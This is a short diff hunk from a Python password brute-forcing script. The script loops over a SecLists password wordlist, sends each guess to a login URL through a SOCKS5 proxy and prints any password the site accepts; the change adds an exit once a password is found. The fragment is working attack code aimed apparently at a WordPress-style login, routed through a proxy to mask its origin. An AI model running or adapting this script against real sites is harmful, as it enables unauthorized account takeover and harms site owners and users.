@@ -43,6 +43,7 @@ with open('/opt/cracking/SecLists/Passwords/probable-v2-top12000.txt', 'rb') as 
       rr = requests.post(url, headers=headers, cookies=cookies, data=data, proxies={'http': 'socks5h://%s:%s' % (PROXYHOST, PROXYPORT), 'https': 'socks5h://%s:%s' % (PROXYHOST, PROXYPORT)}).text
       if 'he password you entered for the username' not in rr:
         print(f'password!! --> {ll}')
+        exit(0)
       cc += 1
 
     except Exception as e:
